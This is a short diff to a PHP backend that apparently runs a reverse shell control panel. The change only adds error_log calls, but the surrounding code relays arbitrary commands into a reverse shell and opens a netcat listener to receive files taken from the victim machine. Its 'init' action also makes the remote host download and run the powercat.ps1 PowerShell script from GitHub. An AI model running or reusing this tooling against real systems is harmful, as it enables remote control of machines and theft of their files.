@@ -91,16 +91,19 @@ if (isset($_POST['action'])) {
     
     switch($_POST['action']){
         case "logs":
+            error_log("Received logs action");
             echo file_get_contents($outputfile);
         break;
         
         case "write":
+            error_log("Received write action");
             if (isset($_POST['command']) && strcmp($_POST['command'], "") != 0) {
                 echo writeToReverseShell($_POST['command'], $outputfile, $maxsleep);
             }
         break;
         
         case "download":
+            error_log("Received download action");
             session_write_close();
             shell_exec("nc -lp " . $fileTransferPort . " > ../tmp/test.pdf &");
             sleep(1);
@@ -113,12 +116,14 @@ if (isset($_POST['action'])) {
         break;
         
         case "init":
+            error_log("Received init action");
             $cmd = '(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1", "./powercat.ps1"); . ./powercat.ps1';
             $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
             $powercatFolder = substr($result, 0, -2);
             echo $result;
         break;
         case "list":
+            error_log("Received list action");
             $cmd = "Get-ChildItem -Force";
             $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
             $jsonData = new DirectoryData;
